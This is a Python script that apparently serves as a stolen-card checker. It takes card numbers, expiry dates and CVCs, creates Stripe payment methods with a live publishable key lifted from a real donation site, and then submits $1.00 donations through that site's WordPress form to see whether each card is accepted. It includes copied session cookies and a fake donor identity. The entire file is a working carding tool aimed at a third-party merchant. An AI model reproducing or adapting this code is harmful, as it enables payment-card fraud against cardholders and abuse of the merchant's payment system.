import requests

def Tele(ccx):
    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")

    # Adjust `yy` to ensure it contains only two digits
    if "20" in yy:
        yy = yy.split("20")[1]

    r = requests.session()

    # Define headers and data for the first request
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fb2d52e5892%3B+stripe-js-v3%2Fb2d52e5892%3B+card-element&referrer=https%3A%2F%2Fstore.urbanintellectuals.com&time_on_page=50083&key=pk_live_51AsBhoBdtygdp7aFScml5x3ULbjE0pexUglwUnEzPRB2TLwS9Yey2bISLB3giKyuPkPFLJREQK1wQuTvysZRD6Xh00D75TygTo'

    r1 = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    pm = r1.json().get('id')

    if not pm:
        return {"error": "Failed to retrieve payment method ID"}

    # Define cookies, headers, and data for the second request
    cookies = {
        '_ga': 'GA1.1.410417492.1730447789',
        '_gcl_au': '1.1.1499731567.1730447791',
        '_tt_enable_cookie': '1',
        '_ttp': 'yfHVWLjR59YSpRbIVeKdgk2B8dB',
        '__cf_bm': 'J9fq0aB.Y6avcNYEsOO7wv.5W2GYZvZPU38W.52ef2s-1730665683-1.0.1.1-9es97CjJyqepelC2XCjmiQuWKzzTCC.7g_iZqnI0utliFPa3gPFYtC5DXpQrsZd2kdjjJ73T0fx.YpvZdFIv4g',
        '_cfuvid': '.XoGxCIx9gBcIyojzaT0iUGWaLDExjm88cqWZ2Sqjl8-1730665683292-0.0.1.1-604800000',
        'wffn_traffic_source': 'https://www.google.com/',
        'wffn_flt': '2024-11-3 15:28:11',
        'wffn_timezone': 'Asia/Rangoon',
        'wffn_is_mobile': 'true',
        'wffn_browser': 'Chrome',
        'wffn_referrer': 'https://www.google.com/',
        'wffn_fl_url': '/donate/',
        '_clck': 'jrws1t%7C2%7Cfqk%7C0%7C1766',
        '_ga_CZ2TGBH8QS': 'GS1.1.1730665693.2.1.1730665707.0.0.0',
        '_clsk': '1rayerh%7C1730665721036%7C1%7C1%7Cq.clarity.ms%2Fcollect',
        '_fbp': 'fb.1.1730665735474.261905935988315915',
    }

    headers = {
        'authority': 'store.urbanintellectuals.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://store.urbanintellectuals.com',
        'referer': 'https://store.urbanintellectuals.com/donate/?srsltid=AfmBOorLnDa6SnWHqnA675AxpxlyuoOCWxfuvbQN1HmpsBSb6UrumT-3',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        't': '1730665772858',
    }

    data = {
        'data': f'__fluent_form_embded_post_id=1669077&_fluentform_46_fluentformnonce=da7fd9d8cd&_wp_http_referer=%2Fdonate%2F%3Fsrsltid%3DAfmBOorLnDa6SnWHqnA675AxpxlyuoOCWxfuvbQN1HmpsBSb6UrumT-3&names%5Bfirst_name%5D=waznim&names%5Blast_name%5D=ey&email=waznimey%40gmail.com&input_radio=One%20time%20donation&payment_input=Other&custom-payment-amount=1.00&payment_method=stripe&checkbox_1%5B%5D=&__stripe_payment_method_id={pm}',
        'action': 'fluentform_submit',
        'form_id': '46',
    }

    r2 = r.post(
        'https://store.urbanintellectuals.com/wp-admin/admin-ajax.php',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    )
    
    try:
        return r2.json()
    except ValueError:
        return {"error": "Invalid JSON response"}
